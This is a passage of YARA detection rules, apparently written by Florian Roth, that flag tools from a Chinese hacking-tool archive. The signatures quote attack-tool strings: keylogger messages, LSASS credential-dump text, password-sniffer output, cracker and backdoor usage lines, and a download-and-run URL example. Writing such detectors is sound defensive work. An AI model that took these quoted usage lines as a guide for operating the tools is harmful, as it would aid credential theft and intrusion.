}

rule CN_Hacktools_T_Sniffer {
	meta:
		description = "Chinese Hacktool Archive - file T-Sniffer.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "b788e2a847b133c7b68080af1c3d6585e5cb81dc"
	strings:
		$s0 = "tsniffer.EXE" fullword wide
		$s2 = "tsniffer" fullword wide
		$s5 = "tsniffer Microsoft " fullword wide
	condition:
		all of them
}

rule CN_Hacktools_tools_snot {
	meta:
		description = "Chinese Hacktool Archive - file snot.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "c89c6401ff95c6ce14df2766387140a1dbdcb60c"
	strings:
		$s0 = "[Parse Rules - Completed parsing %d rules - Sending now]" fullword ascii
		$s1 = "snot %s by sniph (sniph00@yahoo.com)" fullword ascii
		$s2 = "parse_rules: [line %d]: Illegal ipopts string %s, ignoring" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_DNS {
	meta:
		description = "Chinese Hacktool Archive - file DNS.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "8b3b7e5734e04a1fce9e24418dc12d885a7d6d93"
	strings:
		$s0 = "dns.exe sourcefile destfile" fullword ascii
		$s1 = "Numerical: %s -> %s" fullword ascii
		$s2 = "DNS Update for SMM Sniffer" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_UrlScan {
	meta:
		description = "Chinese Hacktool Archive - file UrlScan.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "1a860e7b6c8c2ddd1e973deaea4206416793bb0f"
	strings:
		$s2 = "UrlScan installation is complete. UrlScan files were copied to %windir%\\system3" ascii
		$s10 = "UrlScan.inf" fullword ascii
		$s17 = "UrlScanR.dll" fullword ascii
		$s19 = "UrlScan.txt" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_CR_VF220 {
	meta:
		description = "Chinese Hacktool Archive - file CR-VF220.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "f77b7058039264af0f3c618f2f440186ae03b609"
	strings:
		$s1 = "GUSER32.DLL" fullword ascii
		$s4 = "OFTWARE\\Borland\\Delphi" fullword ascii
		$s12 = "!by GanJaMaN [CORE]" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_srvany {
	meta:
		description = "Chinese Hacktool Archive - file srvany.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "88be20fba19ce9462c471f1999410b1c2b511287"
	strings:
		$s16 = "MyService" fullword ascii
		$s17 = "[SRVANY] Unrecognized opcode %ld" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_cachedump {
	meta:
		description = "Chinese Hacktool Archive - file cachedump.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "fb6419b2e9ebecb18d65395fe746b6fb3e6f5c0b"
	strings:
		$s0 = "Unable to open LSASS.EXE process" fullword ascii
		$s19 = "\\\\.\\pipe\\cachedumppipe" fullword ascii
		$s20 = "vLSASS.EXE" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_DatabaseBrowser {
	meta:
		description = "Chinese Hacktool Archive - file DatabaseBrowser.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "b3e593ba6041530189965b538c1d4d00ca91adcf"
	strings:
		$s0 = "db_browser.EXE" fullword wide
		$s2 = "Database Browser" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_hkdoordll {
	meta:
		description = "Chinese Hacktool Archive - file hkdoordll.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "bad90081e8872832f4000a99fe4243488d667168"
	strings:
		$s0 = "Welcome to http://www.yythac.com,use '?' to get command list" fullword ascii
		$s1 = "InjectThread:Error CreateRemoteThread,error code:%d" fullword ascii
		$s11 = "system.log" fullword ascii
		$s12 = "Entering DLL_PROCESS_ATTACH,Process:%s" fullword ascii
		$s20 = "This command is only supported in windows 2000!" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_memdump {
	meta:
		description = "Chinese Hacktool Archive - file memdump.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "43e761e6427225c082876620e3a1660d503ad623"
	strings:
		$s0 = "Usage: %s pid [dump directory]" fullword ascii
		$s2 = "[*] Dump completed successfully, %lu segments." fullword ascii
		$s5 = "%s\\%.8x.rng" fullword ascii
		$s6 = "[*] Creating dump directory...%s" fullword ascii
		$s12 = "[*] Attaching to %lu..." fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_Release_RESSDT {
	meta:
		description = "Chinese Hacktool Archive - file RESSDT.sys"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "d45f538550fbbac45c62faa9de83d8cd5f3c8cd9"
	strings:
		$s0 = "e:\\project\\server\\sys\\i386\\RESSDT.pdb" fullword ascii
		$s1 = "\\Device\\RESSDT" fullword wide
		$s2 = "DisPatchCreate!" fullword ascii
		$s5 = "\\??\\RESSDTDOS" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_srv_interface {
	meta:
		description = "Chinese Hacktool Archive - file srv_interface.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "7d950c2211381cca3d194bce1cd2a184a89c7a76"
	strings:
		$s0 = "C:\\KEYLOG.LOG" nocase ascii
		$s2 = "Delete Keystroke Log" fullword ascii
		$s3 = "Driver was not initialized for device #%d" fullword ascii
		$s4 = "Could not delete key log" fullword ascii
		$s7 = "Key logging started." fullword ascii
		$s8 = "Could not open key log." fullword ascii
		$s10 = "Key log deleted." fullword ascii
		$s11 = "-----[ %s ]-----" fullword ascii
		$s14 = "View Keystroke Log" fullword ascii
		$s18 = "Log Keystrokes" fullword ascii
	condition:
		5 of them
}

rule CN_Hacktools_rainbowcrack_1_2_win_rtgen {
	meta:
		description = "Chinese Hacktool Archive - file rtgen.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "b54ffa61d076ce8451cf4aa05fce7a6ff4257ad5"
	strings:
		$x1 = "by Zhu Shuanglei <shuanglei@hotmail.com>" fullword ascii
		$x2 = "%d of %d rainbow chains generated (%d m %d s)" fullword ascii

		$s13 = "precomputation of this rainbow table already finished" fullword ascii
		$s14 = "rainbow_chain_count:  count of the rainbow chain to generate" fullword ascii
		$s15 = "please use a smaller rainbow_chain_count(less than 134217728)" fullword ascii
		$s17 = "RainbowCrack" fullword ascii
		$s18 = "%s hash speed: %d / s" fullword ascii
		$s19 = "plain space total: %s" fullword ascii
		$s20 = "charset.txt" fullword ascii
	condition:
		( 1 of ($x*) ) or ( 5 of ($s*) )
}

rule CN_Hacktools_sig_18524_demd5_DeMd5 {
	meta:
		description = "Chinese Hacktool Archive - file DeMd5.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "b706e353bf696479a6adcfd49c82e03e0da0b1a8"
	strings:
		$s0 = "http://r4c.126.com" fullword ascii
		$s2 = "r4c.126.com" fullword wide
		$s3 = "DeMd5.exe" fullword wide
		$s4 = "Wrote by K.H.Young 2002,2003" fullword ascii
		$s6 = "DeMD5 (version:2)" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_Thinktecture_Tools_Web_Services_DynamicProxy_2 {
	meta:
		description = "Chinese Hacktool Archive - file Thinktecture.Tools.Web.Services.DynamicProxy.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "c76a606d54c14d28c6f77fc02ea2d19edb23b61e"
	strings:
		$s3 = "Thinktecture.Tools.Web.Services.DynamicProxy" fullword wide
		$s11 = "_Thinktecture_tmp.dll" fullword wide
		$s17 = "get_SoapRequest" fullword ascii
		$s18 = "DynamicWebServiceProxy" fullword ascii
		$s19 = "LIBTEMPDIR" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_MultiG {
	meta:
		description = "Chinese Hacktool Archive - file MultiG.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "37a0e9511e30730fbbb0a4f5bb0c0fd8b51cec12"
	strings:
		$s3 = "Thread %Exits #" fullword ascii
		$s8 = "Due To Control+C " fullword ascii
		$s17 = "!-->/(Byts)" fullword ascii
		$s18 = "Web Serv" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_ntsvcscan {
	meta:
		description = "Chinese Hacktool Archive - file ntsvcscan.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "9322472c7f17e4ccf3b1f31c333eac5b4b083652"
	strings:
		$s0 = "<BR>for remote users to gain access to the source of the pages." fullword ascii
		$s1 = "Service is running in the security context of %s" fullword ascii
		$s3 = "Error getting ACL information  %d" fullword ascii
		$s7 = "Not able to get security descriptor DACL %d" fullword ascii
		$s10 = "Error QueryServiceObjectSecurity %d" fullword ascii
		$s17 = "<BR>users may access this machine." fullword ascii
		$s18 = "The Remote Access Service allows users to dial in to the server. Ensure that" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_p0f {
	meta:
		description = "Chinese Hacktool Archive - file p0f.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "baaae09dbb7417fd76f926043bb44db73d225200"
	strings:
		$s0 = "[!] WARNING: Unknown datalink type %d, assuming no header." fullword ascii
		$s2 = "Usage: %s [ -f file ] [ -i device ] [ -s file ] [ -o file ]" fullword ascii
		$s3 = "p0f - passive os fingerprinting utility, version 2.0.8" fullword ascii
		$s8 = "[!] WARNING: It is a bad idea to combine -F and -R." fullword ascii
		$s17 = "[*] Masquerade detection enabled at threshold %d%%." fullword ascii
	condition:
		4 of them
}

rule CN_Hacktools_tools_Natas {
	meta:
		description = "Chinese Hacktool Archive - file Natas.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "69c71407637f95345626d14304d1bd7276a8d10d"
	strings:
		$s3 = "Network Administrators Tool for Analysing and Sniffing" fullword wide
		$s7 = "User from %d.%d.%d.%d / Pop3 Server Address: %d.%d.%d.%d   ->  login: " fullword ascii
		$s8 = "natas_pw.log" fullword ascii
		$s17 = "Enable Password Log-File" fullword wide
		$s18 = "User from %d.%d.%d.%d : http://%s@%d.%d.%d.%d%s" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_Unpack_TBack {
	meta:
		description = "Chinese Hacktool Archive - file TBack.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "f45c30460744c93c6631591a4c8185d8f23c548c"
	strings:
		$s0 = "Example: Http://12.12.12.12:81/a.exe abc.exe" fullword ascii
		$s1 = "Example: Http://12.12.12.12/a.exe abc.exe" fullword ascii
		$s2 = "Connect IP Port UserName Password         -->Connect To The FTP" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_tools_WinNmap {
	meta:
		description = "Chinese Hacktool Archive - file WinNmap.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "ddaff06757bfd65feeaa9387ec39c09353ce8faa"
	strings:
		$s4 = "Printe" fullword ascii
		$s8 = "_.SCK_LINES/" fullword ascii
		$s12 = "DISCOVERY" fullword ascii
		$s15 = "Varian " fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_asprstripperxp {
	meta:
		description = "Chinese Hacktool Archive - file asprstripperxp.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "8088021a9f510565d5d8b1a8bea70f332560de98"
	strings:
		$s1 = "BAL_HEAP_SELECTED" fullword ascii
		$s2 = "AsprStripperXP v1.1" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_bin_kmodule {
	meta:
		description = "Chinese Hacktool Archive - file kmodule.sys"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "1b0facc1d940f9bb9d877f95c59e60370b94794b"
	strings:
		$s0 = "\\Device\\klister" fullword wide
		$s1 = "\\??\\klister" fullword wide
		$s3 = "klister: cannot create device." fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_LDR {
	meta:
		description = "Chinese Hacktool Archive - file LDR.EXE"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "6f08399154d0423ea76d0b41c5b62647fbb218d2"
	strings:
		$s0 = "$Usage: LDR [/ncmdfile | /commands/] file-name[.EXE | .SYM]" fullword ascii
		$s1 = ".EXE - load .EXE file only (NO SYMBOLS)" fullword ascii
		$s3 = "$Soft-ICE is not loaded$This Version Of LDR.EXE Requires Soft-ICE 2.5 or greater" fullword ascii
		$s4 = "(C) Copyright Nu-Mega Technologies, All rights reserved" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_SuperScan4_0 {
	meta:
		description = "Chinese Hacktool Archive - file SuperScan4.0.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "46ce94251a01088a1e4c1f1f406681e9825147f9"
	strings:
		$s0 = "SuperScan4.exe" fullword wide
		$s1 = "Compressed by Petite (c)1999 Ian Luck." fullword ascii
		$s2 = "www.RealHack.org" fullword wide
		$s5 = "Copyright ? Foundstone Inc. 2000-2003" fullword wide
		$s13 = "SuperScan 4" fullword wide
		$s14 = "Corrupt Data!" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_ranger {
	meta:
		description = "Chinese Hacktool Archive - file ranger.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "67dc3040ac5d984b393c394c2af333dab4c3121c"
	strings:
		$s9 = "Finished Scanning All The Ranges!!!" fullword wide
		$s16 = "\\ranges.txt" fullword wide
		$s17 = "-=-=-=-=Ranger V2.0 C0d3d by Ma622=-=-=-=-" fullword wide
		$s18 = "\\scan.txt" fullword wide
		$s19 = "  ---------Greetz!!!----------------------" fullword wide
	condition:
		4 of them
}

rule CN_Hacktools_binary_p0f {
	meta:
		description = "Chinese Hacktool Archive - file p0f.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "dfcde3c999754686b324fb278f7828e154db38c8"
	strings:
		$s1 = "p0f - passive os fingerprinting utility, version 2.0.4-beta1" fullword ascii
		$s2 = "Usage: %s [ -f file ] [ -i device ] [ -s file ] [ -o file ]" fullword ascii
		$s8 = "[!] WARNING: Non-IP packet received. Bad header_len!" fullword ascii
		$s12 = "-> %d.%d.%d.%d%s:%d (distance %d, link: %s)" fullword ascii
		$s16 = "[*] Masquerade detection enabled at threshold %d%%." fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_DarkSpy105 {
	meta:
		description = "Chinese Hacktool Archive - file DarkSpy105.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "5f65ad5127f47cd1796ae4fbaa74ad3a56997ac3"
	strings:
		$s0 = "darkspy\\darkspy\\Release\\darkspy.pdb" fullword ascii
		$s5 = "DarkSpy: failed to get driver list!" fullword ascii
		$s7 = "wowocock@hotmail.com" fullword wide
		$s9 = "sunmy1@sina.com" fullword wide
		$s10 = "del \"%s\" /A:-" fullword ascii
		$s12 = "darkspy.exe" fullword wide
		$s15 = "DarkSpy: Failed to enumerate keys!" fullword ascii
		$s16 = "e.g.HKEY_LOCAL_MACHINE\\SOFTWARE\\abc" fullword wide
	condition:
		4 of them
}

rule CN_Hacktools_tools_ERunAsX {
	meta:
		description = "Chinese Hacktool Archive - file ERunAsX.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "ca54d324b398037b34f6393447719fbc6e162675"
	strings:
		$s0 = "CreateProcessAsPIDA" fullword ascii
		$s1 = "CreateProcessAsPIDW" fullword ascii
		$s2 = "ERunAsX.dll" fullword ascii
	condition:
		PEFILE and all of ($s*)
}

rule CN_Hacktools_SlimFTPd {
	meta:
		description = "Chinese Hacktool Archive - file SlimFTPd.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "f0a6a5d88ad7353d3fa5195bc7ea2748463e7d30"
	strings:
		$s0 = "SlimFTPd.exe" fullword wide
		$s3 = "Copyright (C) 2001-2003 WhitSoft Development" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_tools_ADDHI {
	meta:
		description = "Chinese Hacktool Archive - file ADDHI.EXE"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "9bde8617589e24172d6225c04956e52346e879b8"
	strings:
		$s4 = "Add Hi Memory To DOS Utility" fullword ascii
		$s5 = "SOFTICE1" fullword ascii
		$s6 = "$Usage: ADDHI" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_ExploitDigger {
	meta:
		description = "Chinese Hacktool Archive - file ExploitDigger.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "0a5dd3206a05d241f2ce37c969fa4592da7f82a9"
	strings:
		$s0 = "exploitdigger.exe" fullword wide
		$s2 = "goldsun" fullword wide
		$s3 = "exploitdigger" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_tools_SVCHOST {
	meta:
		description = "Chinese Hacktool Archive - file SVCHOST.EXE"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "2d60b32adaf852958a10238e7c74afca9dd36ace"
	strings:
		$s0 = "Command3" fullword ascii
		$s1 = "svpost" fullword ascii
		$s3 = "chs.dll*" fullword ascii
		$s4 = "Copyright (C) Microsoft Corp. 1994-1996" fullword wide
		$s5 = "Visual " fullword ascii
		$s18 = "ListwTo" fullword ascii
		$s20 = "pInfoAG" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_mysql_pwd_crack_2 {
	meta:
		description = "Chinese Hacktool Archive - file mysql_pwd_crack.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "57d1cb4d404688804a8c3755b464a6e6248d1c73"
	strings:
		$s1 = "Successfully --> username %s password %s " fullword ascii
		$s4 = "zhouzhen@gmail.com http://zhouzhen.eviloctal.org" fullword ascii
		$s7 = "-a automode  automatic crack the mysql password " fullword ascii
		$s8 = "mysql_pwd_crack 127.0.0.1 -x 3306 -a" fullword ascii
		$s20 = "usage : mysql_pwd_crack [ip] [options]" fullword ascii
	condition:
		PEFILE and 1 of ($s*)
}

rule CN_Hacktools_tools_xsniff {
	meta:
		description = "Chinese Hacktool Archive - file xsniff.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "d61d7329ac74f66245a92c4505a327c85875c577"
	strings:
		$s0 = "xsiff.exe -pass -hide -log pass.log" fullword ascii
		$s4 = "%-5s%s->%s Bytes=%d TTL=%d Port: %d->%d Len=%d" fullword ascii
		$s5 = "Code by glacier <glacier@xfocus.org>" fullword ascii
		$s9 = "USER: %s, PASS: %s" fullword ascii
		$s10 = "-port <Port> : Output Packets when port equal to <Port>" fullword ascii
		$s11 = "http://www.xfocus.org" fullword ascii
	condition:
		PEFILE and ( 2 of ($s*) )
}

rule CN_Hacktools_tools_TCCrack {
	meta:
		description = "Chinese Hacktool Archive - file TCCrack.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "7cae684a4e25e08cccc83b1f770b9deccaddcac8"
	strings:
		$s0 = "TrueCrypt Password Cracker"
		$s2 = "tombkeeper@xfocus.org" fullword ascii
		$s1 = "Usage: %s <encrypted volume file or device> <password>" fullword ascii
		$s3 = "cat wordlist.txt |  %s <encrypted volume file or device>" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_by064cli {
	meta:
		description = "Chinese Hacktool Archive - file by064cli.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "f9bde76683ba91ec04b1f72d97b204d71c43dd1f"
	strings:
		$s0 = "byshell.exe -install" fullword ascii
		$s4 = "baiyuanfan@163.com" fullword ascii
		$s5 = "input the password(the default one is 'by')" fullword ascii
		$s7 = "c:\\download\\file.txt" fullword ascii
		$s8 = "c:\\remotedesktop.bmp" fullword ascii
		$s9 = "please input your own ip address:(if you type a false ip,you will get no reply f" ascii
		$s12 = "eg.  #popmsghello,are you all right?" fullword ascii
		$s18 = "#SYN 172.18.1.5 15 1 445 12345" fullword ascii
		$s19 = "xfocus.net" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_srv_sendkeys {
	meta:
		description = "Chinese Hacktool Archive - file srv_sendkeys.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "6dcedc4947f3c88e28a130b55d774ededa3c0bf0"
	strings:
		$s1 = "Searching for Password fields, please wait" fullword ascii
		$s3 = "List all Passwords currently displayed" fullword ascii
		$s4 = "srv_sendkeys.dll" fullword ascii
		$s18 = "BO2K Sendkeys Alpha" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_User_Plugins_CMsnv1 {
	meta:
		description = "Chinese Hacktool Archive - file CMsnv1.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "2967cd1e37e591fc8deedca6e009f9579ccd8ffc"
	strings:
		$s3 = "EVENT_SINK_GetIDsOfNamesK" fullword ascii
		$s5 = "CMsnv1.dll" fullword ascii
		$s9 = "Zombie8" fullword ascii
		$s10 = "~Program File" fullword ascii
		$s11 = "SocketWW" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_ext_server_net {
	meta:
		description = "Chinese Hacktool Archive - file ext_server_net.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "49acaddc9a030a8bb1d1c0ee7f0ac14ac19e550e"
	strings:
		$s0 = "command_deregister" fullword ascii
		$s1 = "command_register" fullword ascii
		$s2 = "ext_server_net.dll" fullword ascii
		$s7 = "metsrv.dll" fullword ascii
		$s8 = "channel_get_id" fullword ascii
		$s10 = "scheduler_insert_waitable" fullword ascii
		$s11 = "scheduler_remove_waitable" fullword ascii
		$s14 = "packet_create_response" fullword ascii
		$s19 = "0&020D0R0a0r0" fullword ascii
		$s20 = "network_system_route" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_utils_scrmake {
	meta:
		description = "Chinese Hacktool Archive - file scrmake.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "a911c86a322f75bb3e7f47fc9fca48101ef7471c"
	strings:
		$s1 = "example: scrmake -i netcat.exe -o netcat.scr" fullword ascii
		$s2 = "(c)2005 Ollie Whitehouse - ol at uncon dot org" fullword ascii
		$s6 = "scrmake -i <input file> -o <output file>" fullword ascii
		$s7 = "[D] Input %s" fullword ascii
		$s8 = "www dot blackops dot cn" fullword ascii
		$s10 = "[*] Goodbye!" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_tools_mServer_2 {
	meta:
		description = "Chinese Hacktool Archive - file mServer.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "a5d0ab6bed45294902ea95e74b6c6e697e495c99"
	strings:
		$s0 = "mServer.exe" fullword wide
		$s1 = "www.ph4nt0m.com" fullword wide
		$s3 = "Getoiva" fullword ascii
		$s4 = "Security Heaven" fullword wide
		$s10 = "mServer" fullword wide
	condition:
		4 of them
}

rule CN_Hacktools_ChkFile_ChkFile {
	meta:
		description = "Chinese Hacktool Archive - file ChkFile.com"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "4d2b327fc251501593dc183a412cba4c26882ce7"
	strings:
		$s0 = "%systemroot%" fullword ascii
		$s3 = "ChkFile" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_sdclean_sdc {
	meta:
		description = "Chinese Hacktool Archive - file sdc.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "f9e0ab966d20fc62371f4429135cfb53ba008069"
	strings:
		$s1 = "USAGE: SDC [-option] <RawDumpFile> [<DestinationFile>]" fullword ascii
		$s2 = "ScreenDump Converter" fullword ascii
		$s4 = "-h : HTML, raw output will be converted to HTML (default)" fullword ascii
		$s7 = "across all browsers" fullword ascii
		$s8 = "fOSSiL and Ghiribizzo" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_KProcCheck_2 {
	meta:
		description = "Chinese Hacktool Archive - file KProcCheck.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "03e4841f5b1858abf33374266ec3119791b31411"
	strings:
		$s0 = "System32\\DRIVERS\\KProcCheck.sys" fullword ascii
		$s16 = "Sorry, this version supports only Win2K" fullword ascii
		$s20 = "Error calling Process32First!" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_wfpdisable {
	meta:
		description = "Chinese Hacktool Archive - file wfpdisable.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "9a61f9636e586261a79e4aa00d0985f7556f584f"
	strings:
		$s4 = "wfpdisable - Disables Windows File Protection" fullword ascii
		$s9 = "PSSVSSW" fullword ascii
		$s10 = "WFP disabled." fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_wscan {
	meta:
		description = "Chinese Hacktool Archive - file wscan.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "8c62e0fe0f6476e96ba170a60c05d7b6872ad182"
	strings:
		$s0 = "GAIsProcessorFeature" fullword ascii
		$s5 = "GetLaFA" fullword ascii
		$s14 = "Rich51" fullword ascii
		$s16 = "KERNEL32" fullword ascii
		$s19 = "[FIXED]@" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_xftpd {
	meta:
		description = "Chinese Hacktool Archive - file xftpd.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "3abe425ec336004bc45032f10168066781d1adfc"
	strings:
		$s0 = "%s - simple ftp service" fullword ascii
		$s2 = "xftp 2000 2001 d:\\temp" fullword ascii
		$s6 = "Usage: xftpd <Ctrl_port> <Data_port> <Home_dir> [User] [Pass]" fullword ascii
		$s14 = "Code by glacier <glacier@xfocus.org>" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_ResumeTelnet {
	meta:
		description = "Chinese Hacktool Archive - file ResumeTelnet.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "d5108f20ec6ca450ca4a6c4d2f7b15db09fe48cb"
	strings:
		$s1 = "http://www.thugx.com" fullword ascii
		$s2 = "http://www.fz5fz.org" fullword ascii
		$s3 = "Email:Inetufo@thugx.com" fullword ascii
		$s4 = "Usage: ResumeTelnet <IP> <UserName> <Password>" fullword ascii
		$s5 = "**********ResumeTelnet,Written By Inetufo" fullword ascii
		$s6 = "Hello from MFC!" fullword wide
	condition:
		2 of them
}

rule CN_Hacktools_bin_Server {
	meta:
		description = "Chinese Hacktool Archive - file Server.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "c8c1004f1580d2f47bb632dc5214d00a627ea3db"
	strings:
		$s0 = "configserver" fullword ascii
		$s1 = "upfileer" fullword ascii
		$s2 = "upfileok" fullword ascii
		$s3 = "fxftest" fullword ascii
		$s4 = "WinSocket," fullword ascii
		$s8 = "!Richg" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_DRDoS_2 {
	meta:
		description = "Chinese Hacktool Archive - file DRDoS.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "6dda44f43896452dbcf1b55711e674500e243aa8"
	strings:
		$s1 = "Copyright (C) 2003 KrystalEye.com" fullword ascii
		$s2 = "Email: ngmnhat@yahoo.com" fullword ascii
		$s9 = "-Each zombie is described by 5 numbers:" fullword ascii
		$s10 = "-Each line contains 1 zombie's information" fullword ascii
		$s11 = "Good luck! Thanks for using this tool!" fullword ascii
		$s15 = "*** Syntax of list file ***" fullword ascii
		$s20 = "%hu %hu %hu %hu %hu" fullword ascii
	condition:
		4 of them
}

rule CN_Hacktools_srv_ZXCFG {
	meta:
		description = "Chinese Hacktool Archive - file ZXCFG.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "16fe1859e70bc8dcb82fdb93956764a21b4f5b0d"
	strings:
		$x1 = "ZXShell" fullword wide
		$x2 = "vPasswd" fullword ascii

		$s0 = "www.xxx.com" fullword ascii
		$s1 = "name=\"Microsoft.Windows.Test\"" fullword ascii
		$s2 = "<description>Your app description here</description> " fullword ascii
	condition:
		uint16(0) == 0x5A4D and
		( $x1 and $x2 ) or
		( all of ($s*) )
}

rule CN_Hacktools_smartkid_Update {
	meta:
		description = "Chinese Hacktool Archive - file Update.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "9c163fa4adc1f5735685f68d2f3a21c1cebe1983"
	strings:
		$s0 = "Update.EXE" fullword wide
		$s3 = ":update.exe " fullword ascii
		$s4 = "\\update.ini" fullword ascii
		$s5 = "update.ini" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_XScanLib {
	meta:
